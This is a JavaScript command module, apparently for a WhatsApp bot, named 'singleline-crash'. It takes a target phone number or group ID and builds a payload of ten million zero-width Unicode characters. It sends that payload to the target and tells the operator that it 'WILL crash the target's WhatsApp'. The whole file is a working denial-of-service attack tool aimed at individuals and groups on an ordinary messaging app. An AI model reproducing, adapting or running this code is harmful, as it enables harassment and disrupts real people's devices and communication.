export default {
  name: "singleline-crash",
  description: "Send massive single-line zero-width crash",
  async execute(msg, { sock, args }) {
    try {
      let target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ Usage: ?singleline-crash <number/group>\n\nExample:\n?singleline-crash 234XXXXXXXXXX\n?singleline-crash 120XXXXXXX@g.us`
        });
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return sock.sendMessage(msg.key.remoteJid, { 
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" 
          });
        }
        target = target + "@s.whatsapp.net";
      }

      console.log(`[INFO] Executing singleline-crash on target: ${target}`);

      // Generate massive single-line payload
      const chars = ["\u200B","\u200C","\u200D","\u200E","\u200F"];
      let payload = "";
      for(let i=0; i<10_000_000; i++) {
        payload += chars[i % chars.length];
      }

      // Send the payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `💀 Single-line crash payload sent to ${target}!\n📊 Payload size: ${payload.length} characters\n⚠️ WARNING: This WILL crash the target's WhatsApp!`
      });

    } catch (error) {
      console.error(`[ERROR] Singleline-crash command failed:`, error);
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send singleline crash: " + error.message
      });
    }
  }
};